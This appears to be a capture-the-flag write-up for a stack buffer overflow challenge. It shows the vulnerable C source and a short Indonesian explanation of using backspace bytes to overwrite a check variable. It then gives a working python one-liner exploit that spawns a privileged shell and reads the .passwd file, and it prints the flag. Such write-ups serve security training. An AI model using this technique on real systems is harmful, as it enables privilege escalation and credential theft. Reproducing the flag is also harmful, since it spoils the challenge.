<h1>ELF x86 - Stack buffer overflow basic 3</h1>
<h3>Description</h3>

```c
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
 
void shell(void);
 
int main()
{
 
  char buffer[64];
  int check;
  int i = 0;
  int count = 0;
 
  printf("Enter your name: ");
  fflush(stdout);
  while(1)
    {
      if(count >= 64)
        printf("Oh no...Sorry !\n");
      if(check == 0xbffffabc)
        shell();
      else
        {
            read(fileno(stdin),&i,1);
            switch(i)
            {
                case '\n':
                  printf("\a");
                  break;
                case 0x08:
                  count--;
                  printf("\b");
                  break;
                case 0x04:
                  printf("\t");
                  count++;
                  break;
                case 0x90:
                  printf("\a");
                  count++;
                  break;
                default:
                  buffer[count] = i;
                  count++;
                  break;
            }
        }
    }
}
 
void shell(void)
{
  setreuid(geteuid(), geteuid());
  system("/bin/bash");
}
```
<h3>Solution</h3>
<label>Bufferoverflow mundur, input \x08\x08\x08\x08 yaitu count-- untuk mundur dan menimpa variable check</label>

```console
app-systeme-ch16@challenge02:~$ (python -c "print('\x08'*4+'\xbc\xfa\xff\xbf')";echo cat .passwd) | ./ch16
Enter your name: Sm4shM3ify0uC4n
```
<h3>Flag</h3>
<pre>
Sm4shM3ify0uC4n
</pre>
